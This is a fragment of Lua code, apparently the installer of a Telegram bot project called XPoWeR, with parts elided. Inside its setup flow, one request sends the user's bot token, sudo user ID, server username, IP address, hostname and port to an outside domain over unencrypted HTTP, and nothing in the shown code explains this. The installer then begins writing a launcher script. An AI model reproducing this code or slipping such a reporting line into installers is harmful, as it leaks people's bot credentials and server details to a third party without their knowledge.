...
local token = io.read()
if token ~= '' then
data,res = https.request("https://XPoWeR-api.ml/index.php?p=XPoWeR-DeV")
if res == 200 then
tr = json:decode(data)
...
data,res = https.request("https://XPoWeR-api.ml/index.php?bn=info&id="..Id)
if res == 200 then
...
http.request("https://XPoWeR-api.ml/index.php?n=XPoWeR-DeV&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
local RunBot = io.open("XPoWeR", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/XPoWeR
